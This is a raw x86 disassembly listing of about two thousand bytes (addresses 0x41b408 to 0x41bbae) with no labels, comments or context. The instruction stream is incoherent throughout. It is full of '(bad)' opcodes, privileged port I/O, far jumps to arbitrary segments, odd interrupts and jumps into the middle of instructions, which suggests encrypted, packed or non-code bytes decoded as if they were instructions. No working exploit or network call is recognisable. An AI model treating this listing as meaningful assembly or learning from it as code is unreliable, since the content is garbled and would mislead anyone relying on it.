  41b408:	fcom   DWORD PTR [ecx-0x7e]
  41b40b:	jmp    0x41b45e
  41b40d:	jmp    0x92802d56
  41b412:	das    
  41b413:	js     0x41b3c0
  41b415:	dec    edx
  41b416:	daa    
  41b417:	pusha  
  41b418:	push   0x7a
  41b41a:	jecxz  0x41b3cc
  41b41c:	inc    esp
  41b41d:	fmulp  st(1),st
  41b41f:	out    dx,eax
  41b420:	addr16 inc ebp
  41b422:	xor    dh,BYTE PTR [edx+0x1de34b51]
  41b428:	ds test al,0x4e
  41b42b:	popa   
  41b42c:	outs   dx,DWORD PTR ds:[esi]
  41b42d:	loop   0x41b40b
  41b42f:	mov    dh,0xa4
  41b431:	shl    DWORD PTR [eax+edi*1],1
  41b434:	cmp    DWORD PTR [edx-0x72],ecx
  41b437:	shr    DWORD PTR [edx+ebx*1-0x7f4a0811],0x9e
  41b43f:	adc    DWORD PTR [ecx-0x6e58f189],edx
  41b445:	outs   dx,BYTE PTR ds:[esi]
  41b446:	(bad)  
  41b448:	pop    ebx
  41b449:	retf   
  41b44a:	ror    BYTE PTR [edx-0x72],1
  41b44d:	jl     0x41b4c6
  41b44f:	imul   eax,DWORD PTR [ebp+0x30],0x8b32f81
  41b456:	sahf   
  41b457:	or     al,0x27
  41b459:	adc    bl,0xe3
  41b45c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b45d:	push   ebp
  41b45e:	add    eax,0x98602b81
  41b463:	sbb    ch,BYTE PTR [esi+0x8]
  41b466:	sub    al,BYTE PTR [ecx+0x69]
  41b469:	pop    edx
  41b46a:	pop    esi
  41b46b:	inc    eax
  41b46c:	add    edx,DWORD PTR [esi-0xa]
  41b46f:	mov    ecx,0x9128537
  41b474:	xor    BYTE PTR ds:0x85570279,ch
  41b47a:	sub    BYTE PTR [ebx-0x63],ah
  41b47d:	cmp    DWORD PTR [ecx+0x2b],ecx
  41b480:	leave  
  41b481:	test   DWORD PTR [ecx],edx
  41b483:	or     BYTE PTR [ebp-0x3653a299],bh
  41b489:	and    bh,BYTE PTR [ecx]
  41b48b:	cli    
  41b48c:	(bad)  
  41b48d:	mov    edi,0xde579b90
  41b492:	or     edi,DWORD PTR [edi+0x41]
  41b495:	lods   al,BYTE PTR ds:[esi]
  41b496:	out    dx,eax
  41b497:	lock lock daa 
  41b49a:	xchg   BYTE PTR [edi+0x6747d494],dl
  41b4a0:	out    0x92,eax
  41b4a2:	inc    esi
  41b4a3:	aaa    
  41b4a4:	inc    edi
  41b4a5:	bound  eax,QWORD PTR ds:0x7aeaa343
  41b4ab:	and    BYTE PTR [ebp+0x793b42e0],ch
  41b4b1:	inc    ebx
  41b4b3:	push   cs
  41b4b4:	and    BYTE PTR [esi+ecx*2+0x3e],0xa3
  41b4b9:	in     eax,dx
  41b4ba:	test   BYTE PTR [eax-0x172a7024],bh
  41b4c0:	push   ss
  41b4c1:	xor    al,BYTE PTR [edx-0x60c38de0]
  41b4c7:	xchg   eax,eax
  41b4c9:	jecxz  0x41b4fc
  41b4cb:	cmp    BYTE PTR [edx-0x17],ch
  41b4ce:	jmp    0x14d2529b
  41b4d3:	sahf   
  41b4d4:	fldenv [edi-0x5b]
  41b4d7:	cwde   
  41b4d8:	inc    ecx
  41b4d9:	mov    ebp,?
  41b4db:	int    0xab
  41b4dd:	sub    eax,0xe1bdb385
  41b4e2:	push   ss
  41b4e3:	pop    ebx
  41b4e4:	pop    ebx
  41b4e5:	call   0xc960:0x7a73c4b0
  41b4ec:	mov    ds:0xaa7a1c29,eax
  41b4f1:	mov    ah,0x6b
  41b4f3:	in     al,0xb0
  41b4f5:	mov    al,0x4c
  41b4f7:	test   BYTE PTR ds:0xbb0a97c2,ch
  41b4fd:	sub    al,0x17
  41b4ff:	xchg   edi,eax
  41b500:	push   0xdaa2b6d0
  41b505:	jl     0x41b515
  41b507:	jo     0x41b4e0
  41b509:	jmp    0xdb16:0xe46578fa
  41b510:	sbb    DWORD PTR [eax+0x3e],edi
  41b513:	inc    esi
  41b514:	jno    0x41b496
  41b516:	adc    DWORD PTR [esi+0x25aa7832],eax
  41b51c:	xor    al,0xc4
  41b51e:	cmp    al,0x2e
  41b520:	cs cdq 
  41b522:	(bad)  
  41b523:	cld    
  41b524:	dec    ebp
  41b525:	push   esp
  41b526:	pop    ecx
  41b527:	dec    ecx
  41b528:	push   cs
  41b529:	mov    esi,0xd2c85b2d
  41b52e:	sub    al,0xf7
  41b530:	in     eax,0x68
  41b532:	xor    eax,0x593c2d20
  41b537:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b538:	mov    esp,0x33c945e5
  41b53d:	mov    ss,edi
  41b53f:	mov    ebp,0x7d89a6ec
  41b544:	cmp    bh,BYTE PTR [di]
  41b547:	ss jmp 0xfa725947
  41b54d:	out    dx,eax
  41b54e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b54f:	neg    edi
  41b551:	cmp    al,0x6e
  41b553:	push   esi
  41b554:	jae    0x41b4d6
  41b556:	int3   
  41b557:	and    BYTE PTR [ebp-0x23079da4],bl
  41b55d:	inc    esp
  41b55e:	mov    ebx,0x9a1163c4
  41b563:	pop    esp
  41b564:	jno    0x41b5d5
  41b566:	jge    0x41b5cf
  41b568:	pop    edi
  41b569:	adc    DWORD PTR [edi-0xee43d00],eax
  41b56f:	icebp  
  41b570:	add    eax,0xac4b7008
  41b575:	in     al,0xca
  41b577:	rol    BYTE PTR [eax+ebx*8],cl
  41b57a:	xor    al,0x89
  41b57c:	mov    ah,BYTE PTR [esi]
  41b57e:	xor    eax,0x1a77b9d4
  41b583:	or     al,0x43
  41b585:	or     DWORD PTR [edx-0x48],esi
  41b588:	aad    0x6f
  41b58a:	and    DWORD PTR [ebx+0x2d5354aa],edi
  41b590:	add    esi,DWORD PTR [ebx]
  41b592:	jle    0x41b552
  41b594:	idiv   eax
  41b596:	xor    eax,0x1af18954
  41b59b:	xor    cl,ah
  41b59d:	mov    bl,0xe1
  41b59f:	or     al,0x1f
  41b5a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5a2:	(bad)  
  41b5a3:	fdivr  QWORD PTR [edi]
  41b5a5:	sbb    eax,0x6edd1b24
  41b5aa:	pop    ebp
  41b5ab:	or     al,BYTE PTR [edx+0x228e3757]
  41b5b1:	add    eax,0x8682996a
  41b5b6:	test   edx,edi
  41b5b8:	pushf  
  41b5b9:	push   cs
  41b5ba:	aas    
  41b5bb:	out    0xd1,al
  41b5bd:	push   cs
  41b5be:	call   0x1444:0x5087d8e8
  41b5c5:	and    ebp,DWORD PTR ds:0xce911d58
  41b5cb:	ds (bad) 
  41b5cd:	test   eax,0x76853064
  41b5d2:	in     eax,0x97
  41b5d4:	mov    bh,BYTE PTR [esp+ebx*8-0x2f]
  41b5d8:	push   ss
  41b5d9:	(bad)  
  41b5da:	bswap  edi
  41b5dc:	out    0xa9,al
  41b5de:	inc    ebx
  41b5df:	or     ch,BYTE PTR [eax+eiz*2-0x5a5b0fa3]
  41b5e6:	adc    al,BYTE PTR [bp+si]
  41b5e9:	in     al,0xa5
  41b5eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5ec:	lock mov al,ds:0x94c83dcd
  41b5f2:	(bad)  
  41b5f3:	mov    DWORD PTR [edx],ebp
  41b5f5:	mov    DWORD PTR [esi],eax
  41b5f7:	rcr    BYTE PTR [ebp-0x5a02e0e9],0xe1
  41b5fe:	mov    ch,0xbc
  41b600:	shr    BYTE PTR [edi-0xe],0x86
  41b604:	add    al,0x55
  41b606:	iret   
  41b607:	mov    DWORD PTR [eax-0x467a0347],esi
  41b60d:	cmp    eax,0x89a6eee0
  41b612:	adc    bl,bh
  41b614:	inc    esi
  41b615:	std    
  41b616:	inc    ebp
  41b617:	mov    al,ds:0x686c0704
  41b61c:	xchg   DWORD PTR [ecx-0x1c7b4d5],ecx
  41b622:	sub    al,0x94
  41b624:	pop    edi
  41b625:	cld    
  41b626:	out    dx,eax
  41b627:	lea    esp,[esi+0x5c]
  41b62a:	jno    0x41b672
  41b62c:	dec    esp
  41b62d:	ds ja  0x41b5b1
  41b630:	shl    BYTE PTR [eax-0x519dd85f],cl
  41b636:	xor    dl,dh
  41b638:	pop    ds
  41b639:	mov    ecx,0x8690a30f
  41b63e:	lods   al,BYTE PTR ds:[esi]
  41b63f:	jne    0x41b61e
  41b641:	fisttp DWORD PTR es:[ebx]
  41b644:	cli    
  41b645:	inc    ebp
  41b646:	or     esp,ebx
  41b648:	jne    0x41b5ff
  41b64a:	fadd   st(7),st
  41b64c:	push   ss
  41b64d:	mov    bh,0x8d
  41b64f:	out    0xc9,eax
  41b651:	int    0xe8
  41b653:	dec    edi
  41b654:	inc    ecx
  41b655:	(bad)  
  41b656:	out    dx,al
  41b657:	mov    ebx,0xf77f91ac
  41b65c:	outs   dx,DWORD PTR ds:[esi]
  41b65d:	pop    eax
  41b65e:	pop    ebp
  41b65f:	ret    0x628f
  41b662:	mov    cl,0x16
  41b664:	retf   
  41b665:	xchg   esi,eax
  41b666:	fmul   st,st(3)
  41b668:	xlat   BYTE PTR ds:[ebx]
  41b669:	push   0x1e6e3a58
  41b66e:	push   ss
  41b66f:	iret   
  41b670:	scas   al,BYTE PTR es:[edi]
  41b671:	pop    es
  41b672:	ds pop es
  41b674:	and    esi,ebp
  41b676:	xchg   edi,eax
  41b677:	jg     0x41b6e8
  41b679:	mov    ebp,0x2a2b1e38
  41b67e:	ret    0xd07
  41b681:	dec    ecx
  41b682:	scas   al,BYTE PTR es:[edi]
  41b683:	xor    BYTE PTR [ebx+eax*4+0x43],ah
  41b687:	int    0x74
  41b689:	add    edi,DWORD PTR [esi-0x49929a63]
  41b68f:	jmp    0x41b6ad
  41b691:	not    BYTE PTR [ecx+0x75f03fc4]
  41b697:	sti    
  41b698:	mov    ch,0x28
  41b69a:	out    dx,eax
  41b69b:	xchg   DWORD PTR [edx+0x74],ecx
  41b69e:	and    ebx,ebx
  41b6a0:	mov    ecx,DWORD PTR [ecx+ebp*1-0x6c]
  41b6a4:	adc    BYTE PTR ds:0x26767cc8,dh
  41b6aa:	outs   dx,DWORD PTR ds:[esi]
  41b6ab:	xchg   ecx,eax
  41b6ac:	arpl   WORD PTR [edi-0x682b8c15],bx
  41b6b2:	jecxz  0x41b6d4
  41b6b4:	adc    al,0x79
  41b6b6:	in     eax,0x55
  41b6b8:	mov    WORD PTR [ecx+0x15],es
  41b6bb:	rcl    dh,1
  41b6bd:	and    DWORD PTR [ebp-0x3cd1531b],ebp
  41b6c3:	ja     0x41b73e
  41b6c5:	aad    0x40
  41b6c7:	push   ecx
  41b6c8:	scas   al,BYTE PTR es:[edi]
  41b6c9:	mov    edi,0xd63e152b
  41b6ce:	push   cs
  41b6cf:	dec    ecx
  41b6d0:	test   eax,0xf831e847
  41b6d5:	icebp  
  41b6d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6d7:	or     al,0x99
  41b6d9:	shr    DWORD PTR [esi-0x1f16482d],0x80
  41b6e0:	lahf   
  41b6e1:	or     edx,DWORD PTR [eax]
  41b6e3:	out    dx,eax
  41b6e4:	shl    DWORD PTR [ecx-0x542abe7],1
  41b6ea:	inc    esp
  41b6eb:	xor    BYTE PTR [ebx],ah
  41b6ed:	adc    DWORD PTR ss:[edx+esi*1-0x3587a9ca],esp
  41b6f5:	test   BYTE PTR [ebp+0x1d],dh
  41b6f8:	mov    ah,0x6b
  41b6fa:	dec    ebp
  41b6fb:	mov    ah,0x7b
  41b6fd:	pop    esi
  41b6fe:	rcr    BYTE PTR [esp+ebx*8-0x64909a72],1
  41b705:	mov    ebx,0x83fdc7fc
  41b70a:	je     0x41b694
  41b70c:	icebp  
  41b70d:	cwde   
  41b70e:	enter  0xa08b,0xa3
  41b712:	inc    esp
  41b713:	ficomp WORD PTR [esi]
  41b715:	mov    dh,0x73
  41b717:	dec    ecx
  41b718:	mov    ebp,0x7184b7e0
  41b71d:	mov    dl,dl
  41b71f:	jmp    0x186b:0x77216b7d
  41b726:	inc    ecx
  41b727:	hlt    
  41b728:	inc    ebx
  41b729:	mov    ebx,0x728f0603
  41b72e:	ja     0x41b74a
  41b730:	test   BYTE PTR [edx+edx*2+0x1bb5fe74],bh
  41b737:	mov    DWORD PTR ds:0x7bf239ee,esi
  41b73d:	sub    DWORD PTR [edi+0x6b],eax
  41b740:	ds mov dl,0xc9
  41b743:	mov    dl,0x5d
  41b745:	xor    bh,BYTE PTR [esi]
  41b747:	test   al,0x73
  41b749:	xor    dl,BYTE PTR [edi-0xa]
  41b74c:	jne    0x41b790
  41b74e:	sub    cl,BYTE PTR [esi+0x45]
  41b751:	or     edx,ecx
  41b753:	xor    al,BYTE PTR [esi]
  41b755:	jne    0x41b6f5
  41b757:	loop   0x41b6e1
  41b759:	fbld   TBYTE PTR [eax+ebx*2]
  41b75c:	jmp    0xe75:0x1b81b489
  41b763:	push   ebx
  41b764:	pop    esi
  41b765:	mov    al,0x5e
  41b767:	mov    ch,0x49
  41b769:	aaa    
  41b76a:	ss pushf 
  41b76c:	jp     0x41b7e2
  41b76e:	dec    eax
  41b76f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b770:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b771:	mov    dl,0x72
  41b773:	sub    DWORD PTR [ebx-0x8],0x20
  41b777:	inc    esp
  41b778:	iret   
  41b779:	jle    0x41b738
  41b77b:	cli    
  41b77c:	fwait
  41b77d:	or     BYTE PTR [edx+0x9],dh
  41b780:	dec    esi
  41b781:	ins    BYTE PTR es:[edi],dx
  41b782:	pop    ds
  41b783:	shufps xmm0,XMMWORD PTR [edx-0x6856ec19],0xe8
  41b78b:	in     al,dx
  41b78c:	jmp    0x41b761
  41b78e:	mov    bl,0xb2
  41b790:	ss call 0xf02b7ba7
  41b796:	mov    ecx,0x125c02c0
  41b79b:	lahf   
  41b79c:	adc    edx,DWORD PTR [ebp-0x39]
  41b79f:	adc    DWORD PTR [ebp+0x13c7cd2d],0xc5e5a0f
  41b7a9:	shl    bl,1
  41b7ab:	sub    eax,0x8b2699cf
  41b7b0:	or     ah,0x0
  41b7b3:	mov    bh,0xdb
  41b7b5:	push   esp
  41b7b6:	xor    ecx,DWORD PTR [ebp-0x675a768a]
  41b7bc:	pop    ebx
  41b7bd:	out    0x95,al
  41b7bf:	mov    ch,0xe9
  41b7c1:	mov    bh,0x5
  41b7c3:	retf   
  41b7c4:	iret   
  41b7c5:	in     eax,0xc4
  41b7c7:	inc    DWORD PTR [ecx-0x16a7dfa0]
  41b7cd:	mov    ecx,DWORD PTR [edx-0x27]
  41b7d0:	mov    DWORD PTR [edx+0x2be51b8a],edi
  41b7d6:	cmp    dl,dh
  41b7d8:	add    dh,BYTE PTR [eax-0x7b74ce7a]
  41b7de:	xlat   BYTE PTR ds:[ebx]
  41b7df:	(bad)  
  41b7e0:	cmp    al,0x21
  41b7e2:	popa   
  41b7e3:	add    bh,BYTE PTR [ecx]
  41b7e5:	(bad)  
  41b7e6:	cmp    ch,bl
  41b7e8:	call   0xeb78dca7
  41b7ed:	adc    dl,BYTE PTR [esp+esi*1-0x62e6d48a]
  41b7f4:	retf   
  41b7f5:	inc    ebx
  41b7f6:	repnz pop ds
  41b7f8:	cmp    eax,0x13a24cba
  41b7fd:	inc    ebx
  41b7fe:	mov    ah,BYTE PTR [ebx+0x4bb5931e]
  41b804:	lods   al,BYTE PTR ds:[esi]
  41b805:	or     BYTE PTR [eax],al
  41b807:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b808:	or     ecx,edx
  41b80a:	mov    bh,0xe6
  41b80c:	in     al,0xd9
  41b80e:	out    0x3c,eax
  41b810:	lds    ebp,FWORD PTR [ebx+0x2edc47bb]
  41b816:	sahf   
  41b817:	push   ss
  41b818:	cmp    BYTE PTR [ebp+eiz*1+0x7df81b76],dh
  41b81f:	aad    0x73
  41b821:	das    
  41b822:	aas    
  41b823:	(bad)  
  41b824:	push   esi
  41b825:	inc    esi
  41b826:	jmp    0x81a2:0x4b117650
  41b82d:	jge    0x41b847
  41b82f:	arpl   di,sp
  41b831:	leave  
  41b832:	icebp  
  41b833:	ds loop 0x41b82c
  41b836:	retf   
  41b837:	repnz add edx,ebx
  41b83a:	dec    edx
  41b83b:	retf   0xc472
  41b83e:	mov    ah,0x9a
  41b840:	xor    ch,bh
  41b842:	and    eax,0x5b2b25a0
  41b847:	dec    ebp
  41b848:	jb     0x41b898
  41b84a:	dec    esp
  41b84b:	sbb    edi,0xffffffac
  41b84e:	fdiv   QWORD PTR [edi+0x717af8e2]
  41b854:	fild   WORD PTR [eax]
  41b856:	xor    cl,bl
  41b858:	mov    al,ds:0xa632a529
  41b85d:	mov    al,ds:0xdb260db4
  41b862:	push   es
  41b863:	bound  eax,QWORD PTR [ecx]
  41b865:	ret    0xc0ff
  41b868:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b869:	pop    ebp
  41b86a:	cmp    DWORD PTR [edi],ebp
  41b86c:	adc    eax,0x3e99c377
  41b871:	std    
  41b872:	xchg   edi,eax
  41b873:	loopne 0x41b8e4
  41b875:	pop    ds
  41b876:	lock test al,0xa
  41b879:	and    DWORD PTR [esi+edi*4],eax
  41b87c:	mov    dl,0x96
  41b87e:	mov    edx,0x5ac74a1c
  41b883:	push   esi
  41b884:	xchg   DWORD PTR [eax],edx
  41b886:	push   es
  41b887:	dec    BYTE PTR [ebx-0x68]
  41b88a:	bound  eax,QWORD PTR [ebx+0xf5e6f32]
  41b890:	int3   
  41b891:	add    DWORD PTR [ecx],esp
  41b893:	jmp    0x41b843
  41b895:	xor    al,0x19
  41b897:	sub    al,0x63
  41b899:	in     eax,0xe0
  41b89b:	test   eax,0x68548857
  41b8a0:	jecxz  0x41b8ad
  41b8a2:	fsubp  st(2),st
  41b8a4:	ror    BYTE PTR [eax+0x1e35ed51],1
  41b8aa:	ins    BYTE PTR es:[edi],dx
  41b8ab:	xchg   sp,ax
  41b8ad:	imul   ebx,ebx,0x758eafbd
  41b8b3:	mov    ch,0x23
  41b8b5:	lahf   
  41b8b6:	jb     0x41b8af
  41b8b8:	mov    WORD PTR [ecx-0xabece90],gs
  41b8be:	xor    al,0xe0
  41b8c0:	pop    esp
  41b8c1:	mul    esp
  41b8c3:	mov    dl,0x2e
  41b8c5:	or     cl,0x5f
  41b8c8:	std    
  41b8c9:	popf   
  41b8ca:	mov    esi,0x231c099e
  41b8cf:	sub    BYTE PTR [ecx-0x1c],al
  41b8d2:	cmp    edi,DWORD PTR [edx-0x1f6e5ff1]
  41b8d8:	cdq    
  41b8d9:	mov    ebp,0x850f7352
  41b8de:	push   eax
  41b8df:	pop    edi
  41b8e0:	push   ss
  41b8e1:	loopne 0x41b922
  41b8e3:	mov    al,0xe
  41b8e5:	stos   BYTE PTR es:[edi],al
  41b8e6:	test   al,0x8
  41b8e8:	mov    ch,0x86
  41b8ea:	mov    bl,0x48
  41b8ec:	or     eax,0xdc6741d2
  41b8f1:	ffreep st(0)
  41b8f3:	test   eax,0x3068a365
  41b8f8:	adc    esp,edx
  41b8fa:	mov    eax,0xcd73b699
  41b8ff:	push   cs
  41b900:	jo     0x41b926
  41b902:	pop    ds
  41b903:	retf   0x38ee
  41b906:	in     eax,0x6b
  41b908:	mov    ah,0xed
  41b90a:	fcom   DWORD PTR [edi-0xe]
  41b90d:	cs test ecx,0xa0dc92aa
  41b914:	inc    ebx
  41b915:	pop    es
  41b916:	add    al,0x50
  41b918:	cdq    
  41b919:	and    cl,BYTE PTR [esi+0x12]
  41b91c:	push   0x7c9e820
  41b921:	lods   al,BYTE PTR ds:[esi]
  41b922:	jb     0x41b8a7
  41b924:	das    
  41b925:	sub    eax,DWORD PTR [esi-0x4de22ce]
  41b92b:	push   0x7b
  41b92d:	xchg   bh,al
  41b92f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b930:	dec    ecx
  41b931:	in     al,dx
  41b932:	js     0x41b9ad
  41b934:	sub    al,0xda
  41b936:	sub    ah,BYTE PTR ds:0x1c8ed67b
  41b93c:	pand   mm0,QWORD PTR [edi-0x7241ed41]
  41b943:	xor    ah,dh
  41b945:	mul    DWORD PTR [ecx-0x2a]
  41b948:	pop    ecx
  41b949:	pop    ebp
  41b94a:	sar    DWORD PTR fs:[esi],0x1c
  41b94e:	jae    0x41b8ec
  41b950:	call   0x54e8b609
  41b955:	arpl   WORD PTR [edx],dx
  41b957:	mul    DWORD PTR [eax-0x3fac28bf]
  41b95d:	mov    WORD PTR [edi],fs
  41b95f:	jmp    0x5def3a3
  41b964:	pop    es
  41b965:	inc    edx
  41b966:	push   ds
  41b967:	mov    al,ds:0xd2382946
  41b96c:	sub    edi,eax
  41b96e:	cmc    
  41b96f:	jl     0x41b8f3
  41b971:	fimul  DWORD PTR [ebx+edx*2-0x531432e7]
  41b978:	add    ch,bl
  41b97a:	cli    
  41b97b:	out    dx,al
  41b97c:	cmp    esi,edi
  41b97e:	or     ebx,ebx
  41b980:	push   ebx
  41b981:	xor    eax,0x577794ad
  41b986:	popf   
  41b987:	retf   0xbf9a
  41b98a:	cmp    DWORD PTR ds:0xa06ae09f,0xffffffd4
  41b991:	int3   
  41b992:	mov    ds:0x3cb53d7d,al
  41b997:	jbe    0x41b976
  41b999:	add    eax,0x404b5b38
  41b99e:	adc    eax,0x5c146672
  41b9a3:	ret    0x4dd
  41b9a6:	clc    
  41b9a7:	emms   
  41b9a9:	dec    ebx
  41b9aa:	fld    QWORD PTR [esi]
  41b9ac:	adc    al,0xd5
  41b9ae:	stc    
  41b9af:	ja     0x41b9d7
  41b9b1:	call   0xf94a:0xffd502e4
  41b9b8:	addr16 dec edi
  41b9ba:	sub    esi,DWORD PTR [ebx-0xe9d1cc8]
  41b9c0:	cs in  al,0x48
  41b9c3:	leave  
  41b9c4:	push   esp
  41b9c5:	int3   
  41b9c6:	pushf  
  41b9c7:	inc    ebx
  41b9c8:	cmp    DWORD PTR [edi-0x77],edx
  41b9cb:	jns    0x41b9ec
  41b9cd:	push   es
  41b9ce:	mov    esp,0x4bcd9e5f
  41b9d3:	mov    WORD PTR [bx+di],fs
  41b9d6:	(bad)  
  41b9d7:	pop    edi
  41b9d8:	in     eax,0xa5
  41b9da:	add    eax,0x29e1c390
  41b9df:	add    bh,BYTE PTR [esi+ebp*8]
  41b9e2:	or     al,bl
  41b9e4:	inc    eax
  41b9e5:	jp     0x41ba0f
  41b9e7:	ins    BYTE PTR es:[edi],dx
  41b9e8:	add    BYTE PTR [ebx],al
  41b9ea:	mov    ch,0x6b
  41b9ec:	scas   al,BYTE PTR es:[edi]
  41b9ed:	dec    edx
  41b9ee:	mov    bh,BYTE PTR [ebp+0x2a]
  41b9f1:	pop    es
  41b9f2:	les    eax,FWORD PTR [esi]
  41b9f4:	sub    DWORD PTR ds:0x1ed07844,ebp
  41b9fa:	imul   ebp,DWORD PTR [edx+eax*8],0xb0001a2d
  41ba01:	scas   al,BYTE PTR es:[edi]
  41ba02:	loopne 0x41ba45
  41ba04:	outs   dx,BYTE PTR ds:[esi]
  41ba05:	fwait
  41ba06:	inc    edi
  41ba07:	mov    esi,0x21a57314
  41ba0c:	mov    eax,ds:0x1ebb0b0f
  41ba11:	aad    0x77
  41ba13:	js     0x41ba16
  41ba15:	icebp  
  41ba16:	or     dh,dl
  41ba18:	std    
  41ba19:	cwde   
  41ba1a:	test   DWORD PTR [eax-0x147f9f07],0x7a7e47e
  41ba24:	cmp    edx,ebx
  41ba26:	aas    
  41ba27:	push   ebp
  41ba28:	sahf   
  41ba29:	pop    edi
  41ba2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba2b:	sbb    DWORD PTR [ecx-0x26],edx
  41ba2e:	mov    esp,0xb660e96b
  41ba33:	ja     0x41ba99
  41ba35:	dec    ecx
  41ba36:	push   0x29
  41ba38:	popa   
  41ba39:	xlat   BYTE PTR ds:[ebx]
  41ba3a:	test   DWORD PTR [edx+0xf803326],ebx
  41ba40:	jnp    0x41ba60
  41ba42:	mov    ebp,esi
  41ba44:	out    0x31,al
  41ba46:	repnz mov bl,0xff
  41ba49:	mov    WORD PTR [ebx],gs
  41ba4b:	sub    ch,BYTE PTR [eax-0x7eb9354f]
  41ba51:	mov    cl,0x54
  41ba53:	or     BYTE PTR [ebp-0x12],cl
  41ba56:	ror    DWORD PTR ss:[edx+ebp*2],cl
  41ba5a:	cld    
  41ba5b:	loop   0x41ba17
  41ba5d:	sub    BYTE PTR [eax+0x10e9c552],ah
  41ba63:	xor    eax,0xc8bd63a5
  41ba68:	cwde   
  41ba69:	xor    dh,dh
  41ba6b:	pop    es
  41ba6c:	and    al,0x93
  41ba6e:	fstp   DWORD PTR [edi-0x42c510a1]
  41ba74:	xlat   BYTE PTR ds:[ebx]
  41ba75:	aaa    
  41ba76:	jle    0x41ba62
  41ba78:	(bad)  
  41ba79:	pop    edi
  41ba7a:	scas   ax,WORD PTR es:[edi]
  41ba7c:	add    al,0x16
  41ba7e:	ja     0x41ba30
  41ba80:	mov    ebx,0x8b8d370
  41ba85:	pusha  
  41ba86:	pushf  
  41ba87:	xlat   BYTE PTR ds:[ebx]
  41ba88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba89:	fisub  WORD PTR [ecx+0x859bb6]
  41ba8f:	jge    0x41ba8e
  41ba91:	retf   0xa8ac
  41ba94:	pop    esi
  41ba95:	adc    esp,DWORD PTR [ebp*4-0x191a37]
  41ba9c:	mov    DWORD PTR cs:[ecx-0x42],ebp
  41baa0:	loopne 0x41ba70
  41baa2:	xor    DWORD PTR [edx],edx
  41baa4:	shr    ebx,0x1a
  41baa7:	mov    fs,WORD PTR [esi]
  41baa9:	imul   esi,DWORD PTR [ecx],0x6c
  41baac:	fmul   QWORD PTR [esi]
  41baae:	popa   
  41baaf:	mov    BYTE PTR [ebx-0x54],dh
  41bab2:	push   ss
  41bab3:	lock xchg ebp,eax
  41bab5:	dec    edx
  41bab6:	out    dx,al
  41bab7:	mov    bh,BYTE PTR [eax+0xbe9b6d2]
  41babd:	cmp    al,0xa2
  41babf:	loope  0x41bae5
  41bac1:	lahf   
  41bac2:	xchg   esp,eax
  41bac3:	sbb    esp,0xffffffee
  41bac6:	xchg   esi,eax
  41bac7:	add    dh,ch
  41bac9:	stos   DWORD PTR es:[edi],eax
  41baca:	data16 je 0x41ba91
  41bacd:	dec    edx
  41bace:	or     BYTE PTR [edi+0x3af53557],ah
  41bad4:	inc    esi
  41bad5:	es add eax,0x78f8cfe2
  41badb:	or     ch,BYTE PTR [edx+0x4cc5f4f3]
  41bae1:	mov    esp,0x28c548bd
  41bae6:	xchg   esp,eax
  41bae7:	sub    BYTE PTR [ecx+eax*1+0x6887fe3],cl
  41baee:	ds xchg edx,eax
  41baf0:	add    al,0x0
  41baf2:	pop    esi
  41baf3:	mov    esp,0x72b224e3
  41baf8:	ror    DWORD PTR [ecx+0xc],cl
  41bafb:	loop   0x41bb4f
  41bafd:	pop    esp
  41bafe:	mov    dh,ch
  41bb00:	stos   BYTE PTR es:[edi],al
  41bb01:	dec    ebp
  41bb02:	fimul  DWORD PTR [edi+edi*2]
  41bb05:	pop    ecx
  41bb06:	inc    ecx
  41bb07:	cwde   
  41bb08:	push   ds
  41bb09:	adc    edi,DWORD PTR [bx+0x10]
  41bb0d:	(bad)  
  41bb0e:	xor    eax,DWORD PTR [ebx+0x7ebc7e35]
  41bb14:	xor    edi,esp
  41bb16:	jmp    0x41baa8
  41bb18:	mov    eax,ds:0x23b04fb2
  41bb1d:	out    0x53,al
  41bb1f:	retf   0xa1
  41bb22:	sahf   
  41bb23:	add    dl,BYTE PTR [ecx+0x6ab22ada]
  41bb29:	retf   
  41bb2a:	inc    esp
  41bb2b:	lds    edx,FWORD PTR [edi]
  41bb2d:	mov    eax,ds:0x7d2a3c80
  41bb32:	dec    eax
  41bb33:	out    0x7f,eax
  41bb35:	lahf   
  41bb36:	xor    DWORD PTR [edi-0x4afdc19e],ebx
  41bb3c:	dec    eax
  41bb3d:	ja     0x41bac2
  41bb3f:	sbb    edi,0x43
  41bb42:	div    BYTE PTR [ecx+edx*4-0x67]
  41bb46:	or     DWORD PTR [edx+0x25],0xb70ab110
  41bb4d:	ficom  WORD PTR [ebx+0x3d]
  41bb50:	xchg   esp,eax
  41bb51:	mov    ds:0x1b708cc2,al
  41bb56:	iret   
  41bb57:	sbb    DWORD PTR [eax+ebx*8],esi
  41bb5a:	fcmovnbe st,st(1)
  41bb5c:	dec    ebx
  41bb5d:	jmp    0xddcd:0xef577c9c
  41bb64:	mov    DWORD PTR [eax-0x48],ebx
  41bb67:	mov    ah,BYTE PTR [ebp+0x5e]
  41bb6a:	mov    edi,0x60f9e14f
  41bb6f:	gs ret 0xb0b4
  41bb73:	xor    bh,BYTE PTR [ebp-0x2b]
  41bb76:	(bad)  
  41bb77:	pop    ds
  41bb78:	into   
  41bb79:	iret   
  41bb7a:	mov    eax,esi
  41bb7c:	call   0x3204:0x9ba89eea
  41bb83:	std    
  41bb84:	nop
  41bb85:	fmul   DWORD PTR [ebp-0x25]
  41bb88:	cwde   
  41bb89:	mov    ebp,0x13e08893
  41bb8e:	add    esp,edi
  41bb90:	xor    eax,0x849ba5fa
  41bb95:	sub    ebx,DWORD PTR ds:[esi+ebp*8+0x7c4c26da]
  41bb9d:	xchg   esp,eax
  41bb9e:	mov    ds:0x5355c12c,eax
  41bba3:	(bad)  
  41bba4:	rcl    DWORD PTR [edx+eiz*1+0x5d156dea],1
  41bbab:	imul   ecx,DWORD PTR [ecx],0x2b
  41bbae:	gs in  al,0x44
